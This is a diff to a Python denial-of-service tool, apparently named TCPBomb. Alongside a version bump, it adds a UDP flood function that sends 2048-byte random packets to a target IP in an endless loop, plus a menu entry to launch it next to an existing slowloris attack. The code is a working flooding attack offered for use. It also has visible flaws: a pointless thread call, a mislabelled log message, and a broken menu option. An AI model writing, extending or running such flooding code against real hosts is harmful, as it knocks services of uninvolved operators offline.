@@ -9,7 +9,7 @@ global url
 url = ""
 port = 80
 threads = 0
-version = float(1.8)
+version = float(1.9)
 currentversion = requests.get('https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/version')
 currentversion = float(currentversion.text.replace(" ",""))
 isUpdate = False
@@ -33,7 +33,7 @@ def update():
 if(currentversion > version):
     open(".IsUp","w")
     update()
-
+	    	
 def slowloris():
     
     sended = 0
@@ -92,6 +92,31 @@ def slowloris():
                 except socket.error:
                     continue
     time.sleep(15)
+
+def udpAttack():
+
+    ip = getIp(url)
+    port = 1
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
+    bytes = random._urandom(2048);
+    sended = 0
+    now = datetime.now()
+    atual = now.second
+    timemsg = atual + 3
+    while True:
+        now = datetime.now()
+        hour = now.hour;
+        minute = now.minute;
+        second = now.second
+        atual = now.second
+        sended += 1
+        threading.Thread(target=ip)
+        sock.sendto(bytes, (ip,port))
+        if timemsg > 60:
+            timemsg = 0;
+        if atual == timemsg:
+            timemsg = now.second + 3;
+            print(f"[{hour}]:[{minute}]:[{second}] Sending slowris attack to: {ip} enviados: {sended}")
 
 def getIp(domain):
 
@@ -249,6 +274,48 @@ def scanMenu():
             time.sleep(2)
             for i in sys.exc_info():
                 print(f"[ERROR] {i}")
+
+def udpMenu():
+
+    print("_______________________")
+    print("")
+    print("""
+    Options:
+
+        [1] - Set URL
+
+        [2] - Attack
+
+        [3] - Go to Main menu
+
+    """)
+
+    print("_______________________")
+    print("")
+    try:
+        while True:
+            op = int(input("--> "))
+            if(op > 3):
+                print("[INFO] Invalid option please try again!")
+            if op == 1:
+            	global url
+            	url = input("Set URL --> ")
+            if op == 2:
+            	udpAttack()
+            if op == 4:
+                time.sleep(2)
+                if os.name == 'nt':
+                    os.system("cls")
+                else:
+                    os.system("clear")
+                mainMenu()
+    except:
+            print("[INFO] Invalid option please try again!")
+            print("[INFO] Log of error in 2 seconds")
+            time.sleep(2)
+            for i in sys.exc_info():
+                print(f"[ERROR] {i}")
+
 
 def slowlorisMenu():
 
@@ -459,7 +526,9 @@ def mainMenu():
 
     [4] - Attack slowloris
 
-    [5] - Exit
+    [5] - Attack udp
+
+    [6] - Exit
 
     """)
     if currentversion > version:
@@ -472,7 +541,7 @@ def mainMenu():
     while True:
         try:
             op = int(input("--> "))
-            if(op > 4):
+            if(op > 6):
                 print("[INFO] Invalid option please try again!")
             elif op == 1:
                 time.sleep(2)
@@ -503,6 +572,13 @@ def mainMenu():
                     os.system("clear")
                 slowlorisMenu()
             elif op == 5:
+                time.sleep(2)
+                if os.name == 'nt':
+                    os.system("cls")
+                else:
+                    os.system("clear")
+                udpMenu()
+            elif op == 6:
                 print("Bye")
                 break
         except:
